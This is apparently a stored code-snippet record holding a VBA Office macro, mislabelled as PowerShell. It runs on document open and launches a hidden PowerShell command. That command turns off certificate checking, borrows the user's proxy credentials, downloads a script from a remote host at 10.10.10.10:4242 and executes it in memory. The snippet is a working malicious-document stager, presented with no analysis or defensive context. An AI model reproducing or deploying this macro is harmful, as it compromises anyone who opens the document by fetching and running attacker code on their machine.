---
id: ecd0eb3f-e36c-4ab4-ac30-4596d2eaca76
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:23.395355+00:00'
updated_at: '2023-04-10T20:36:56.290642+00:00'
---

# Code Snippet ecd0eb3f

**Language**: ps1

```ps1
Sub Execute()
Dim payload
payload = "powershell.exe -nop -w hidden -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$v=new-object net.webclient;$v.proxy=[Net.WebRequest]::GetSystemWebProxy();$v.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $v.downloadstring('http://10.10.10.10:4242/exploit');"
Call Shell(payload, vbHide)
End Sub
Sub Document_Open()
Execute
End Sub
```
